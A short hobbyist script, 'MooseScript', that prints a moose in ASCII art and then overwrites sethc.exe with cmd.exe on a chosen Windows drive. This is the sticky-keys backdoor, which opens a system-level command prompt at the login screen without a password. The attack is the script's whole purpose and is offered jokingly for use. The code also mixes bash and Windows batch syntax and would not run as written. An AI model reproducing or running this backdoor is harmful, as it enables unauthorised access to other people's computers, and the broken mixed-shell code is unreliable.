#!/bin/bash

title MooseScript
color 0a

varcorrect="N"
while [ $[varcorrect^^] = "N" ]
do
read -p "Please input the location of the drive in question (caps matters): " vardrive
read -p "You have selected the :$vardrive drive is this correct? (Y/N) " varcorrect
done

echo           FIRE UP THE MOOSE!
echo
echo          - .:`/`:.
echo         -s.ommdNh-
echo      .`::hNNNdo-
echo      .+h/sMhhy----.`
echo        ./dMMMMMMMMMmyoosssso/.`
echo       +NMMMMMMM-DMOOSE-MMMMMMNdo`
echo       :+::dMyyMMMMMMMMMMMMMMMMod:
echo           `-` hMMMMMMMKEKMMMMMy.`
echo               `hMMm-::-.-sNMhydms-
echo                `MMy       .mm `-hm 
echo                 NNh        m/   `N
echo                 m+N.      +h     h/
echo                +o-h`    `+o`    -y-
echo
echo        Please wait while Mr Moose Works

cd $vardrive/Windows/System32
cp cmd.exe sethc.exe

echo The Moose's work here is done! (hopefully kek)
